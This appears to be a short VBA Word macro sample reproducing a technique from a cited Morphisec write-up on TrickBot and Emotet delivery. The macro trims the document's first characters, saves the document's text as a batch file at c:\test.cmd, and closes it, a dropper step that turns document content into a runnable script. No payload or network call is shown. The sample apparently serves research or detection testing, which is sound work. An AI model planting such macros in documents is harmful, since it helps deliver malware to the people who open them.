REM https://blog.morphisec.com/trickbot-emotet-delivery-through-word-macro

Sub work()
    ActiveDocument.Range(0, 3).Delete
    ActiveDocument.SaveAs2 "c:\\test.cmd", wdFormatText
    ActiveDocument.Close(false)
End Sub
